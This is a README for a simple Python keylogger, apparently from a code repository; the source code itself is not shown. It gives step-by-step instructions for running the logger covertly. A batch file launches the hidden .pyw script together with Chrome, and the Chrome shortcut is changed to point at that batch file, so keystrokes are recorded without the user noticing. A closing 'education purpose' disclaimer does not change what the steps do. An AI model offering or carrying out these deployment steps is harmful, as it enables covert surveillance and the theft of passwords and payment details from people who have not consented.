# A-KeyLogger
A simple keylogger made in Python with the help of pyhook and pywin32 module.

Keystroke logging, often referred to as keylogging or keyboard capturing, is the action of recording (logging) the keys struck on a keyboard, typically covertly, so that the person using the keyboard is unaware that their actions are being monitored. Data can then be retrieved by the person operating the logging program. A keylogger can be either software or hardware.

1.) First use the above code and copy the .pyw file in a folder. Supposedly, you named it as Important.
2.) To run both Chrome and keylogger in background we have to create a Notepad File, and write

      @echo off
      start "" "c:\important\secret_file.pyw"
      start "" "c:\Program Files (x86)\Google\Chrome\Application\chrome.exe"    
      
      
      (This is when,if you want to run keylogger in background of Chrome, For using it with other Browsers, just copy it's target address in place of Chrome's Address)


3.) Save this File as .bat extension and name it as launch.
4.) Go to Desktop, Right click on Chrome's icon and click on it's Properties, and change the Target address with "C:\important\launch.bat"
5.) And now check whether its working or not, just start chrome, and all the keystrokes will be saved in text file in important folder.

Have fun, but remember these are the computer programs designed to work on the target computer’s software. Keyloggers are used in IT organizations to troubleshoot technical problems with computers and business networks. Families and business people use keyloggers legally to monitor network usage without their users’ direct knowledge. However, malicious individuals can use keyloggers on public computers to steal passwords or credit card information.


ITS ONLY FOR EDUCATION PURPOSE, DON'T MISUSE IT.

